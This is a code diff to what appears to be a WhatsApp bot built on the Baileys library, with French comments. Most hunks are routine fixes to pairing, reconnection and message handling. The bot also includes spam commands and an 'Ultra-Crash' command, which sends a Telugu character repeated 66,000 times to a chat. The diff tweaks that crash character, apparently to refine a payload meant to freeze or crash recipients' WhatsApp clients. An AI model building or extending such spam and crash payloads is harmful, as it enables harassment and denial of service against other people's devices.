@@ -201,7 +201,6 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
         console.log(`[${cleanNumber}] Aucune session enregistrée. Préparation à la demande de code d'appairage.`);
     }
 
-    const { Browsers } = require("@whiskeysockets/baileys");
     const sock = makeWASocket({
         version,
         printQRInTerminal: false,
@@ -219,6 +218,8 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
     // --- DEMANDE DE CODE D'APPAIRAGE (si non enregistré) ---
     if (!sock.authState.creds.registered) {
         try {
+            // Attendre un peu que la connexion s'initialise avant de demander le code
+            await sleep(3000);
             const code = await sock.requestPairingCode(cleanNumber);
             const msg = `✅ *SESSION GÉNÉRÉE*\n\nNuméro : ${cleanNumber}\nCode : *${code}*`;
             console.log(`Code d'appairage pour ${cleanNumber} : ${code}`);
@@ -240,8 +241,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
             // Reconnexion si ce n'est pas une déconnexion volontaire (loggedOut) ou une erreur 401
             if (isUnauthorized) {
                 console.log(`Session pour ${cleanNumber} invalide (401 Unauthorized ou déconnexion). Suppression des fichiers de session et redémarrage.`);
-                fs.rmSync(sessionPath, { recursive: true, force: true });
-                createBotInstance(phoneNumber, sockToNotify, jidToNotify);
+                // Optionnel: supprimer le dossier de session ici
             } else if (shouldReconnect) {
                 // Ajout d'un délai avant la reconnexion pour éviter le spam de tentatives
                 await sleep(5000); 
@@ -298,9 +298,9 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
     sock.ev.on("messages.upsert", async ({ messages, type }) => {
         if (type === "notify") {
             for (const msg of messages) {
-                if (!msg.message) return;
-                if (msg.key.remoteJid === "status@broadcast") return; // Ignorer les statuts
-                if (msg.key.fromMe) return; // Ignorer les messages envoyés par le bot lui-même
+                if (!msg.message) continue;
+                if (msg.key.remoteJid === "status@broadcast") continue; // Ignorer les statuts
+                if (msg.key.fromMe) continue; // Ignorer les messages envoyés par le bot lui-même
 
                 const remoteJid = msg.key.remoteJid;
                 const senderName = msg.pushName || "Inconnu";
@@ -325,7 +325,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 }
                 if (lowerText === "stop") {
                     if (current.activeSpams.size > 0) {
-                        current.activeSpams.forEach(timeoutId => clearTimeout(timeoutId));
+                        current.activeSpams.forEach(timeoutId => clearInterval(timeoutId));
                         current.activeSpams.clear();
                         await sock.sendMessage(remoteJid, { text: "✅ Tous les spams ont été arrêtés." });
                     } else {
@@ -514,7 +514,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
 
                 // Commande Ultra-Crash (65000+ caractères)
                 if (lowerText.startsWith("ultra")) {
-                    const char = "జ్ఞా";
+                    const char = "జ్ఞा";
                     const payload = char.repeat(66000);
                     await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
                     try {
